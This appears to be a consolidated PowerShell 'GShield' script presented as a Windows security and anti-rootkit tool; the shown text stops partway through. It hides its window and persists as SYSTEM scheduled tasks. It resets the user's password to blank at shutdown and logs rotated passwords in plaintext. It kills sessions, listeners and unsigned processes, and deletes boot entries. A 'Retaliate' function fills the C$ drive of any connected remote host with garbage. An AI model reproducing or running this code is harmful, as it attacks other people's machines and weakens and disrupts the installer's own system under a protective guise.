
# Hide the PowerShell console window
$null = Add-Type @"
using System;
using System.Runtime.InteropServices;
public class HideConsoleWindow {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    public const int SW_HIDE = 0;
    public const int SW_SHOW = 5;
    public static void Hide() {
        IntPtr hWnd = GetConsoleWindow();
        ShowWindow(hWnd, SW_HIDE);
    }
}
"@
[HideConsoleWindow]::Hide()

# GSecurity.ps1 - Consolidated script with all functions from provided scripts

# Define paths and parameters
$taskName = "GShieldStartup"
$taskDescription = "Runs the GShield script at user logon with admin privileges."
$scriptDir = "C:\Windows\Setup\Scripts"
$scriptPath = "$scriptDir\GShield.ps1"
$quarantineFolder = "C:\Quarantine"
$logFileAntivirus = "$quarantineFolder\antivirus_log.txt"
$logFile = "$env:TEMP\SessionTerminator.log"
$backupDir = "$env:ProgramData\CookieBackup"
$cookieLogPath = "$backupDir\CookieMonitor.log"
$passwordLogPath = "$backupDir\NewPassword.log"
$errorLogPath = "$backupDir\ScriptErrors.log"
$cookiePath = "$env:LocalAppData\Google\Chrome\User Data\Default\Cookies"
$backupPath = "$backupDir\Cookies.bak"

# === Functions from Audio.ps1 ===
function Take-RegistryOwnership {
    param (
        [string]$RegPath
    )
    try {
        $regKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($RegPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::TakeOwnership)
        $acl = $regKey.GetAccessControl()
        $admin = New-Object System.Security.Principal.NTAccount("Administrators")
        $acl.SetOwner($admin)
        $regKey.SetAccessControl($acl)

        # Grant Full Control to Administrators
        $rule = New-Object System.Security.AccessControl.RegistryAccessRule($admin, "FullControl", "Allow")
        $acl.AddAccessRule($rule)
        $regKey.SetAccessControl($acl)
        Write-Host "Ownership and Full Control granted for $RegPath" -ForegroundColor Green
    } catch {
        Write-Host "Failed to take ownership of $RegPath. Error: $_" -ForegroundColor Red
    } finally {
        if ($regKey) { $regKey.Close() }
    }
}

function Enable-AECAndNoiseSuppression {
    $renderDevicesKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\MMDevices\Audio\Render"

    # Get all audio devices under the Render key
    $audioDevices = Get-ChildItem -Path $renderDevicesKey

    foreach ($device in $audioDevices) {
        $fxPropertiesKey = "$($device.PSPath)\FxProperties"

        # Check if the FxProperties key exists, if not, create it
        if (!(Test-Path $fxPropertiesKey)) {
            New-Item -Path $fxPropertiesKey -Force
            Write-Host "Created FxProperties key for device: $($device.PSChildName)" -ForegroundColor Green
        }

        # Take ownership and set permissions for the FxProperties key
        Take-RegistryOwnership -RegPath ($fxPropertiesKey -replace 'HKEY_LOCAL_MACHINE\\', '')

        # Define the keys and values for AEC and Noise Suppression
        $aecKey = "{1c7b1faf-caa2-451b-b0a4-87b19a93556a},6"
        $noiseSuppressionKey = "{e0f158e1-cb04-43d5-b6cc-3eb27e4db2a1},3"
        $enableValue = 1  # 1 = Enable, 0 = Disable

        # Set Acoustic Echo Cancellation (AEC)
        $currentAECValue = Get-ItemProperty -Path $fxPropertiesKey -Name $aecKey -ErrorAction SilentlyContinue
        if ($currentAECValue.$aecKey -ne $enableValue) {
            try {
                Set-ItemProperty -Path $fxPropertiesKey -Name $aecKey -Value $enableValue -ErrorAction Stop
                Write-Host "Acoustic Echo Cancellation set to enabled for device: $($device.PSChildName)" -ForegroundColor Yellow
            } catch {
                Write-Host "Failed to set Acoustic Echo Cancellation for device: $($device.PSChildName). Error: $_" -ForegroundColor Red
            }
        } else {
            Write-Host "Acoustic Echo Cancellation already enabled for device: $($device.PSChildName)" -ForegroundColor Cyan
        }

        # Set Noise Suppression
        $currentNoiseSuppressionValue = Get-ItemProperty -Path $fxPropertiesKey -Name $noiseSuppressionKey -ErrorAction SilentlyContinue
        if ($currentNoiseSuppressionValue.$noiseSuppressionKey -ne $enableValue) {
            try {
                Set-ItemProperty -Path $fxPropertiesKey -Name $noiseSuppressionKey -Value $enableValue -ErrorAction Stop
                Write-Host "Noise Suppression set to enabled for device: $($device.PSChildName)" -ForegroundColor Yellow
            } catch {
                Write-Host "Failed to set Noise Suppression for device: $($device.PSChildName). Error: $_" -ForegroundColor Red
            }
        } else {
            Write-Host "Noise Suppression already enabled for device: $($device.PSChildName)" -ForegroundColor Cyan
        }
    }
}

# === Functions from BCDCleanup.ps1 ===
function Write-Log {
    param ([string]$Message)
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$Timestamp - $Message" | Out-File -FilePath $LogFile -Append
    Write-Output $Message
}

# === Functions from CookieMonitor.ps1 ===
function Log-Info($msg) {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $msg" | Out-File -FilePath $cookieLogPath -Append
}

function Log-Error($msg) {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - ERROR - $msg" | Out-File -FilePath $errorLogPath -Append
}

function Initialize-Environment {
    foreach ($dir in @($logDir, $backupDir)) {
        if (-not (Test-Path $dir)) {
            New-Item -Path $dir -ItemType Directory -Force | Out-Null
        }
    }
}

function Install-Script {
    $targetFolder = Split-Path $taskScriptPath
    if (-not (Test-Path $targetFolder)) {
        New-Item -Path $targetFolder -ItemType Directory -Force | Out-Null
    }

    Copy-Item -Path $PSCommandPath -Destination $taskScriptPath -Force
    Log-Info "Script copied to $taskScriptPath"

    # Unregister all tasks to prevent conflicts
    $taskNames = @("MonitorCookiesLogon", "BackupCookiesOnStartup", "MonitorCookies", "ResetPasswordOnShutdown")
    foreach ($taskName in $taskNames) {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
    }

    # SYSTEM logon task
    $logonTaskName = "MonitorCookiesLogon"
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$taskScriptPath`""
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $logonTaskName -Action $action -Trigger $trigger -Principal $principal

    # Startup backup task
    $backupTaskName = "BackupCookiesOnStartup"
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$taskScriptPath`" -Backup"
    $trigger = New-ScheduledTaskTrigger -AtStartup
    Register-ScheduledTask -TaskName $backupTaskName -Action $action -Trigger $trigger -Principal $principal

    # Monitoring task (every 5 min)
    $monitorTaskName = "MonitorCookies"
    $taskService = New-Object -ComObject Schedule.Service
    $taskService.Connect()
    $taskDefinition = $taskService.NewTask(0)
    $triggers = $taskDefinition.Triggers
    $trigger = $triggers.Create(1) # 1 = TimeTrigger
    $trigger.StartBoundary = (Get-Date).AddMinutes(1).ToString("yyyy-MM-dd'T'HH:mm:ss")
    $trigger.Repetition.Interval = "PT5M" # 5 minutes
    $trigger.Repetition.Duration = "P365D" # 365 days
    $trigger.Enabled = $true
    $action = $taskDefinition.Actions.Create(0)
    $action.Path = "powershell.exe"
    $action.Arguments = "-ExecutionPolicy Bypass -File `"$taskScriptPath`" -Monitor"
    $taskDefinition.Settings.Enabled = $true
    $taskDefinition.Settings.AllowDemandStart = $true
    $taskDefinition.Settings.StartWhenAvailable = $true
    $taskService.GetFolder("\").RegisterTaskDefinition($monitorTaskName, $taskDefinition, 6, "SYSTEM", $null, 4)

    # Shutdown password reset
    $shutdownTaskName = "ResetPasswordOnShutdown"
    $eventTriggerQuery = @"
<QueryList>
  <Query Id="0" Path="System">
    <Select Path="System">*[System[(EventID=1074)]]</Select>
  </Query>
</QueryList>
"@
    $taskService = New-Object -ComObject Schedule.Service
    $taskService.Connect()
    $taskDefinition = $taskService.NewTask(0)
    $triggers = $taskDefinition.Triggers
    $eventTrigger = $triggers.Create(0)
    $eventTrigger.Subscription = $eventTriggerQuery
    $eventTrigger.Enabled = $true
    $action = $taskDefinition.Actions.Create(0)
    $action.Path = "powershell.exe"
    $action.Arguments = "-ExecutionPolicy Bypass -File `"$taskScriptPath`" -ResetPassword"
    $taskDefinition.Settings.Enabled = $true
    $taskDefinition.Settings.AllowDemandStart = $true
    $taskDefinition.Settings.StartWhenAvailable = $true
    $taskService.GetFolder("\").RegisterTaskDefinition($shutdownTaskName, $taskDefinition, 6, "SYSTEM", $null, 4)

    Log-Info "Scheduled tasks installed."
}

function Monitor-Cookies {
    if (-not (Test-Path $cookiePath)) {
        Log-Info "No Chrome cookies found."
        return
    }

    try {
        $currentHash = (Get-FileHash -Path $cookiePath -Algorithm SHA256).Hash
        $lastHash = if (Test-Path $cookieLogPath) { Get-Content $cookieLogPath -Last 1 } else { "" }

        if ($lastHash -and $currentHash -ne $lastHash) {
            Log-Info "Cookie hash changed. Triggering countermeasure..."
            Rotate-Password
            Restore-Cookies
        }

        $currentHash | Out-File -FilePath $cookieLogPath -Force
    } catch {
        Log-Error "Monitor-Cookies error: $_"
    }
}

function Backup-Cookies {
    try {
        Stop-Process -Name "chrome" -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
        if (Test-Path $cookiePath) {
            Copy-Item -Path $cookiePath -Destination $backupPath -Force
            Log-Info "Cookies backed up to $backupPath"
        }
    } catch {
        Log-Error "Backup-Cookies error: $_"
    }
}

function Restore-Cookies {
    try {
        if (Test-Path $backupPath) {
            Copy-Item -Path $backupPath -Destination $cookiePath -Force
            Log-Info "Cookies restored from backup"
        }
    } catch {
        Log-Error "Restore-Cookies error: $_"
    }
}

function Rotate-Password {
    try {
        $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split("\")[1]
        $account = Get-LocalUser -Name $user
        if ($account.UserPrincipalName) {
            Log-Info "Skipping Microsoft account password change."
            return
        }

        $chars = [char[]]('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*')
        $password = -join ($chars | Get-Random -Count 16)
        $securePassword = ConvertTo-SecureString -String $password -AsPlainText -Force
        Set-LocalUser -Name $user -Password $securePassword
        "$((Get-Date).ToString()) - New password: $password" | Out-File -FilePath $passwordLogPath -Append
        Log-Info "Rotated local password."
    } catch {
        Log-Error "Rotate-Password error: $_"
    }
}

function Reset-Password {
    try {
        $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split("\")[1]
        $account = Get-LocalUser -Name $user
        if ($account.UserPrincipalName) {
            Log-Info "Skipping Microsoft account reset."
            return
        }

        $blank = ConvertTo-SecureString "" -AsPlainText -Force
        Set-LocalUser -Name $user -Password $blank
        Log-Info "Password reset to blank on shutdown."
    } catch {
        Log-Error "Reset-Password error: $_"
    }
}

# === Functions from Corrupt.ps1 ===
function Overwrite-File {
    param ($FilePath)
    try {
        if (Test-Path $FilePath) {
            $Size = (Get-Item $FilePath).Length
            $Junk = [byte[]]::new($Size)
            (New-Object Random).NextBytes($Junk)
            [System.IO.File]::WriteAllBytes($FilePath, $Junk)
            Write-Host "Overwrote telemetry file: $FilePath"
        } else {
            Write-Host "File not found: $FilePath"
        }
    } catch {
        Write-Host "Error overwriting ${FilePath}: $($_.Exception.Message)"
    }
}

# === Functions from DevicesFiltering.ps1 ===
# (No additional functions; main logic is in the script body, will be called in main execution)

# === Functions from NetworkDebloat.ps1 ===
# (No additional functions; main logic is in the script body, will be called in main execution)

# === Functions from Retaliate.ps1 ===
function Fill-RemoteHostDriveWithGarbage {
    try {
        # Get incoming TCP connections (where LocalAddress is bound and RemoteAddress is the client)
        $connections = Get-NetTCPConnection | Where-Object { $_.State -eq "Established" }
        if ($connections) {
            foreach ($conn in $connections) {
                $remoteIP = $conn.RemoteAddress
                # Attempt to access the remote host's C$ share (admin share)
                $remotePath = "\\$remoteIP\C$"
                
                # Check if the remote path is accessible (requires admin rights)
                if (Test-Path $remotePath) {
                    $counter = 1
                    while ($true) {
                        try {
                            $filePath = Join-Path -Path $remotePath -ChildPath "garbage_$counter.dat"
                            $garbage = [byte[]]::new(10485760) # 10MB in bytes
                            (New-Object System.Random).NextBytes($garbage)
                            [System.IO.File]::WriteAllBytes($filePath, $garbage)
                            Write-Host "Wrote 10MB to $filePath"
                            $counter++
                        }
                        catch {
                            # Stop if the drive is full or another error occurs
                            if ($_.Exception -match "disk full" -or $_.Exception -match "space") {
                                Write-Host "Drive at $remotePath is full or inaccessible. Stopping."
                                break
                            }
                            else {
                                Write-Host "Error writing to $filePath : $_"
                                break
                            }
                        }
                    }
                }
                else {
                    Write-Host "Cannot access $remotePath - check permissions or connectivity."
                }
            }
        }
        else {
            Write-Host "No incoming connections found."
        }
    }
    catch {
        Write-Host "General error: $_"
    }
}

# === Functions from SecureRemoteAccess.ps1 ===
# (No additional functions; main logic is in the script body, will be called in main execution)

# === Functions from GSecurity.ps1 ===
function Write-RootkitLog {
    param (
        [string]$Message,
        [string]$EntryType = "Information"
    )
    try {
        if (-not [System.Diagnostics.EventLog]::SourceExists("GShield")) {
            New-EventLog -LogName Application -Source "GShield"
        }
        Write-EventLog -LogName Application -Source "GShield" -EntryType $EntryType -EventId 1000 -Message $Message
    } catch {
        Write-Output "$EntryType`: $Message"
    }
}

function Terminate-NonConsoleSessions {
    try {
        # Run qwinsta to list sessions
        $sessions = qwinsta | Where-Object { $_ -notmatch "^\s*>" } # Exclude active session marker
        $sessionList = $sessions -split "`n" | ForEach-Object { $_.Trim() }

        Write-Log "Listing all sessions:"
        $sessions | ForEach-Object { Write-Log $_ }

        # Parse each session
        foreach ($session in $sessionList) {
            # Skip empty lines or headers
            if ($session -match "^\s*(services|console|\S+)\s+(\S+)?\s+(\d+)\s+(\S+)") {
                $sessionName = $matches[1]
                $sessionId = $matches[3]
                $sessionState = $matches[4]

                # Skip console session
                if ($sessionName -notin @("console")) {
                    Write-Log "Terminating session: ID=$sessionId, Name=$sessionName, State=$sessionState"
                    try {
                        rwinsta $sessionId
                        Write-Log "Successfully terminated session ID $sessionId"
                    } catch {
                        Write-Log "Failed to terminate session ID $sessionId : $_"
                    }
                } else {
                    Write-Log "Skipping session: ID=$sessionId, Name=$sessionName (console or services)"
                }
            }
        }
    } catch {
        Write-Log "Error processing sessions: $_"
    }
}

function Terminate-Rootkits {
    try {
        $connections = Get-NetTCPConnection | Where-Object {
            $_.RemoteAddress -match '^10\.|^192\.168\.|^172\.(1[6-9]|2[0-9]|3[01])\.'
        }
        $lanProcIds = $connections.OwningProcess | Sort-Object -Unique

        foreach ($pid in $lanProcIds) {
            try {
                $proc = Get-Process -Id $pid -ErrorAction Stop
                $exePath = $proc.Path

                if ($exePath) {
                    $signature = Get-AuthenticodeSignature -FilePath $exePath
                    if ($signature.Status -ne 'Valid') {
                        Write-RootkitLog "Terminating UNSIGNED process: $($proc.ProcessName) (PID: $pid)"
                        Stop-Process -Id $pid -Force
                    } else {
                        Write-RootkitLog "Skipping signed process: $($proc.ProcessName) (PID: $pid)"
                    }
                } else {
                    Write-RootkitLog "Path unknown for process: $($proc.ProcessName) (PID: $pid)" -EntryType "Warning"
                }
            } catch {
                Write-RootkitLog "Error processing PID $pid`: $($_.ToString())" -EntryType "Warning"
            }
        }
    } catch {
        Write-RootkitLog "Error during detection: $($_.ToString())" -EntryType "Error"
    }
}

function Enable-LsassPPL {
    try {
        $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
        $regName = "RunAsPPL"
        $regValue = 1

        if (-not (Test-Path $regPath)) {
            Write-Error "LSA registry path not found."
            return
        }

        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Type DWord -ErrorAction Stop
        Write-Host "LSASS configured to run as Protected Process Light (PPL). Reboot required."
    }
    catch {
        Write-Error "Failed to enable LSASS PPL: $_"
    }
}

function Clear-CachedCredentials {
    try {
        # Check if cmdkey is available
        $cmdkeyPath = "$env:SystemRoot\System32\cmdkey.exe"
        if (Test-Path $cmdkeyPath) {
            # Clear cached credentials using cmdkey
            & $cmdkeyPath /list | ForEach-Object {
                if ($_ -match "Target:") {
                    $target = $_ -replace ".*Target: (.*)", '$1'
                    & $cmdkeyPath /delete:$target
                }
            }
            Write-Host "Cleared cached credentials from Credential Manager using cmdkey."
        }
        else {
            Write-Warning "cmdkey.exe not found at $cmdkeyPath. Attempting alternative method to clear credentials."
            try {
                $credMan = New-Object -ComObject WScript.Network
                Write-Warning "COM-based credential clearing is not fully supported in this script. Manual cleanup may be required."
            }
            catch {
                Write-Error "No suitable method available to clear cached credentials. Please clear credentials manually via Control Panel > Credential Manager."
                return
            }
        }
    }
    catch {
        Write-Error "Failed to clear cached credentials: $_"
    }
}

function Disable-CredentialCaching {
    try {
        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        $regName = "CachedLogonsCount"
        $regValue = 0

        if (-not (Test-Path $regPath)) {
            Write-Error "Winlogon registry path not found."
            return
        }

        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Type String -ErrorAction Stop
        Write-Host "Disabled cached logon credentials. Set CachedLogonsCount to 0."
    }
    catch {
        Write-Error "Failed to disable credential caching: $_"
    }
}

function Enable-CredentialAuditing {
    try {
        $auditPolicy = auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable
        if ($auditPolicy -match "The command was successfully executed.") {
            Write-Host "Enabled auditing for credential validation events."
        }
        else {
            Write-Error "Failed to enable auditing: $auditPolicy"
        }
    }
    catch {
        Write-Error "Failed to enable auditing: $_"
    }
}

function Detect-InProcControls {
    $allPaths = @()
    $allPaths += Get-ChildItem -Path $basePath -ErrorAction SilentlyContinue | Where-Object { $_.PSChildName -match "{[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}}" }
    $allPaths += Get-ChildItem -Path $hkcrBasePath -ErrorAction SilentlyContinue | Where-Object { $_.PSChildName -match "{[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}}" }

    foreach ($path in $allPaths) {
        $inProcPath = Join-Path $path.PSPath "InProcServer32"
        $inProcHandlerPath = Join-Path $path.PSPath "InprocHandler32"
        $value = $null

        if (Test-Path $inProcPath) {
            $value = (Get-ItemProperty -Path $inProcPath -ErrorAction SilentlyContinue)."(default)"
        } elseif (Test-Path $inProcHandlerPath) {
            $value = (Get-ItemProperty -Path $inProcHandlerPath -ErrorAction SilentlyContinue)."(default)"
        }

        if ($value -and (Test-Path $value)) {
            Write-Host "Detected InProc control at $path.PSPath with value $value"
            return $true, $path.PSPath, $value
        }
    }
    return $false, $null, $null
}

function Remove-InProcControls {
    param ([string]$path, [string]$value)
    if ($path -and $value) {
        try {
            # Remove registry entry
            $parentPath = Split-Path $path -Parent
            $keyName = Split-Path $path -Leaf
            Remove-ItemProperty -Path $parentPath -Name $keyName -Force -ErrorAction Stop
            Write-Host "Removed InProc control registry entry at $path"
            # Remove associated file if it exists
            if (Test-Path $value) {
                Remove-Item -Path $value -Force -ErrorAction Stop
                Write-Host "Removed file: $value"
            }
        } catch {
            Write-Host "Error removing $path : $_"
        }
    }
}

function Disable-Network-Briefly {
    try {
        $adapters = Get-NetAdapter | Where-Object { $_.Status -eq "Up" }
        foreach ($adapter in $adapters) {
            Disable-NetAdapter -Name $adapter.Name -Confirm:$false -ErrorAction SilentlyContinue
        }
        Start-Sleep -Seconds 3
        foreach ($adapter in $adapters) {
            Enable-NetAdapter -Name $adapter.Name -Confirm:$false -ErrorAction SilentlyContinue
        }
        Write-Log "Network temporarily disabled and re-enabled." "Warning"
    } catch {
        Write-Log "Failed to toggle network adapters: $_" "Error"
    }
}

function Kill-Process-And-Parent {
    param ([int]$Pid)
    try {
        $proc = Get-CimInstance Win32_Process -Filter "ProcessId=$Pid"
        if ($proc) {
            Stop-Process -Id $Pid -Force -ErrorAction SilentlyContinue
            Write-Log "Killed process PID $Pid ($($proc.Name))" "Warning"
            if ($proc.ParentProcessId) {
                $parentProc = Get-Process -Id $proc.ParentProcessId -ErrorAction SilentlyContinue
                if ($parentProc) {
                    if ($parentProc.ProcessName -eq "explorer") {
                        Stop-Process -Id $parentProc.Id -Force -ErrorAction SilentlyContinue
                        Start-Process "explorer.exe"
                        Write-Log "Restarted Explorer after killing parent of suspicious process." "Warning"
                    } else {
                        Stop-Process -Id $parentProc.Id -Force -ErrorAction SilentlyContinue
                        Write-Log "Also killed parent process: $($parentProc.ProcessName) (PID $($parentProc.Id))" "Warning"
                    }
                }
            }
        }
    } catch {}
}

function Start-ProcessKiller {
    while ($true) {
        # Kill unsigned or hidden-attribute processes
        Get-CimInstance Win32_Process | ForEach-Object {
            $exePath = $_.ExecutablePath
            if ($exePath -and (Test-Path $exePath)) {
                $isHidden = (Get-Item $exePath).Attributes -match "Hidden"
                $sigStatus = (Get-AuthenticodeSignature $exePath).Status
                if ($isHidden -or $sigStatus -ne 'Valid') {
                    Kill-Process-And-Parent -Pid $_.ProcessId
                    Write-Log "Killed unsigned/hidden process: $exePath" "Warning"
                }
            }
        }

        # Kill stealthy processes (present in WMI but not in tasklist)
        try {
            $visible = tasklist /fo csv | ConvertFrom-Csv | Select-Object -ExpandProperty "PID"
            $all = Get-WmiObject Win32_Process | Select-Object -ExpandProperty ProcessId
            $hidden = Compare-Object -ReferenceObject $visible -DifferenceObject $all | Where-Object { $_.SideIndicator -eq "=>" }

            foreach ($pid in $hidden) {
                try {
                    $proc = Get-Process -Id $pid.InputObject -ErrorAction SilentlyContinue
                    if ($proc) {
                        Kill-Process-And-Parent -Pid $pid.InputObject
                        Write-Log "Killed stealthy (tasklist-hidden) process: $($proc.ProcessName) (PID $($pid.InputObject))" "Error"
                    }
                } catch {}
            }
        } catch {}

        Start-Sleep -Seconds 5
    }
}

function Start-XSSWatcher {
    while ($true) {
        $conns = Get-NetTCPConnection -State Established
        foreach ($conn in $conns) {
            $remoteIP = $conn.RemoteAddress
            try {
                $hostEntry = [System.Net.Dns]::GetHostEntry($remoteIP)
                if ($hostEntry.HostName -match "xss") {
                    Disable-Network-Briefly
                    New-NetFirewallRule -DisplayName "BlockXSS-$remoteIP" -Direction Outbound -RemoteAddress $remoteIP -Action Block -Force -ErrorAction SilentlyContinue
                    Write-Log "XSS detected, blocked $($hostEntry.HostName) and disabled network." "Error"
                }
            } catch {}
        }
        Start-Sleep -Seconds 3
    }
}

function Kill-Listeners {
    $knownServices = @("svchost", "System", "lsass", "wininit") # Safe system processes
    $connections = Get-NetTCPConnection -State Listen -ErrorAction SilentlyContinue

    foreach ($conn in $connections) {
        try {
            $proc = Get-Process -Id $conn.OwningProcess -ErrorAction Stop
            if ($proc.ProcessName -notin $knownServices) {
                Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
            }
        } catch {
            # Ignore processes that no longer exist or access-denied
        }
    }
}

function Start-CrudeKiller {
    $badNames = @("mimikatz", "procdump", "mimilib", "pypykatz")
    foreach ($name in $badNames) {
        Get-Process -Name $name -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    }
}

function Register-SystemLogonScript {
    param (
        [string]$TaskName = "RunGShieldAtLogon"
    )
    $targetPath = "%windir%\Setup\Scripts\unattend-04.ps1"
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$targetPath`""
    $trigger = New-ScheduledTaskTrigger -AtLogon
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    try {
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Principal $principal
        Write-Log "Scheduled task '$TaskName' created to run at user logon under SYSTEM."
    } catch {
        Write-Log "Failed to register task: $($_.Exception.Message)" "Error"
        exit 1
    }
}

function Apply-FirewallRules {
    # Write the registry content to a temporary file
    $tempRegFile = [System.IO.Path]::GetTempFileName() + ".reg"
    $script:registryContent | Out-File -FilePath $tempRegFile -Encoding Unicode

    # Import the registry file to apply the firewall rules
    try {
        reg import $tempRegFile 2>&1 | Out-Null
        Write-Host "Firewall rules applied from registry content at $(Get-Date)."
    } catch {
        Write-Host "Error applying firewall rules: $_"
    }

    # Clean up the temporary file
    Remove-Item $tempRegFile -Force -ErrorAction SilentlyContinue
}

function Start-FirewallMonitor {
    Write-Host "Starting firewall rule monitoring..."

    # Register WMI event for firewall rule changes
    $query = "SELECT * FROM __InstanceModificationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = 4947"
    Register-WmiEvent -Query $query -SourceIdentifier "FirewallRuleChange" -Action {
        Write-Host "Detected firewall rule change at $(Get-Date)"
        Apply-FirewallRules
    }

    Write-Host "Firewall monitoring started. Running in background..."
}

# === Main Execution Logic ===
# Check admin privileges
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
if (-not $isAdmin) {
    Write-Host "ERROR: This script must be run as Administrator. Exiting..." -ForegroundColor Red
    exit
}

# Ensure execution policy allows script
if ((Get-ExecutionPolicy) -eq "Restricted") {
    try {
        Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force -ErrorAction Stop
        Write-Output "Set execution policy to Bypass for current process."
    } catch {
        Write-Output "Failed to set execution policy: $_"
        exit 1
    }
}

# Initialize environment (from CookieMonitor.ps1)
Initialize-Environment

# Setup script directory and copy script (from NetworkDebloat.ps1 and others)
if (-not (Test-Path $scriptDir)) {
    New-Item -Path $scriptDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
    Write-Output "Created script directory: $scriptDir"
}
if (-not (Test-Path $scriptPath) -or (Get-Item $scriptPath).LastWriteTime -lt (Get-Item $MyInvocation.MyCommand.Path).LastWriteTime) {
    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptPath -Force -ErrorAction Stop
    Write-Output "Copied/Updated script to: $scriptPath"
}

# Register scheduled tasks from all scripts
Register-SystemLogonScript -TaskName "RunGShieldAtLogon"
Install-Script

# Execute Audio.ps1 logic
Enable-AECAndNoiseSuppression

# Execute BCDCleanup.ps1 logic
$BackupPath = "C:\BCD_Backup_$(Get-Date -Format 'yyyyMMdd_HHmmss').bcd"
Write-Log "Creating BCD backup at $BackupPath"
try {
    & (Join-Path $env:windir "system32\bcdedit.exe") /export $BackupPath | Out-Null
    Write-Log "BCD backup created successfully."
} catch {
    Write-Log "Error creating BCD backup: $_"
    exit 1
}
$BcdOutput = & (Join-Path $env:windir "system32\bcdedit.exe") /enum all
if (-not $BcdOutput) {
    Write-Log "Error: Failed to enumerate BCD entries."
    exit 1
}
$BcdEntries = @()
$currentEntry = $null
foreach ($line in $BcdOutput) {
    if ($line -match "^identifier\s+({[0-9a-fA-F-]{36}|{[^}]+})") {
        if ($currentEntry) {
            $BcdEntries += $currentEntry
        }
        $currentEntry = [PSCustomObject]@{
            Identifier = $Matches[1]
            Properties = @{}
        }
    } elseif ($line -match "^(\w+)\s+(.+)$") {
        if ($currentEntry) {
            $currentEntry.Properties[$Matches[1]] = $Matches[2]
        }
    }
}
if ($currentEntry) {
    $BcdEntries += $currentEntry
}
$CriticalIds = @("{bootmgr}", "{current}", "{default}")
$SuspiciousEntries = @()
foreach ($entry in $BcdEntries) {
    $isSuspicious = $false
    $reason = ""
    if ($entry.Identifier -in $CriticalIds) {
        continue
    }
    if ($entry.Properties.description -and $entry.Properties.description -notmatch "Windows") {
        $isSuspicious = $true
        $reason += "Non-Windows description: $($entry.Properties.description); "
    }
    if ($entry.Properties.device -match "vhd=") {
        $isSuspicious = $true
        $reason += "Uses VHD device: $($entry.Properties.device); "
    }
    if ($entry.Properties.path -and $entry.Properties.path -notmatch "winload.exe") {
        $isSuspicious = $true
        $reason += "Non-standard boot path: $($entry.Properties.path); "
    }
    if ($isSuspicious) {
        $SuspiciousEntries += [PSCustomObject]@{
            Identifier = $entry.Identifier
            Description = $entry.Properties.description
            Device = $entry.Properties.device
            Path = $entry.Properties.path
            Reason = $reason
        }
    }
}
if ($SuspiciousEntries.Count -eq 0) {
    Write-Log "No suspicious BCD entries found."
} else {
    Write-Log "Found $($SuspiciousEntries.Count) suspicious BCD entries:"
    foreach ($entry in $SuspiciousEntries) {
        Write-Log "Identifier: $($entry.Identifier)"
        Write-Log "Description: $($entry.Description)"
        Write-Log "Device: $($entry.Device)"
        Write-Log "Path: $($entry.Path)"
        Write-Log "Reason: $($entry.Reason)"
        Write-Log "------------------------"
        Write-Log "Deleting entry: $($entry.Identifier)"
        try {
            & (Join-Path $env:windir "system32\bcdedit.exe") /delete $entry.Identifier /f | Out-Null
            Write-Log "Successfully deleted entry: $($entry.Identifier)"
        } catch {
            Write-Log "Error deleting entry $($entry.Identifier): $_"
        }
    }
}
$BcdOutputAfter = & (Join-Path $env:windir "system32\bcdedit.exe") /enum all
if ($BcdOutputAfter) {
    $BcdOutputAfter | Out-File -FilePath $LogFile -Append
    Write-Log "Cleanup complete. Review the log at $LogFile for details."
    Write-Log "BCD backup is available at $BackupPath if restoration is needed."
} else {
    Write-Log "Error: Failed to verify BCD store after cleanup."
}

# Execute CookieMonitor.ps1 logic
Backup-Cookies
Monitor-Cookies

# Execute Corrupt.ps1 logic
$CorruptTelemetry = {
    $TargetFiles = @(
        "$env:ProgramData\Microsoft\Diagnosis\ETLLogs\AutoLogger\AutoLogger-Diagtrack-Listener.etl",
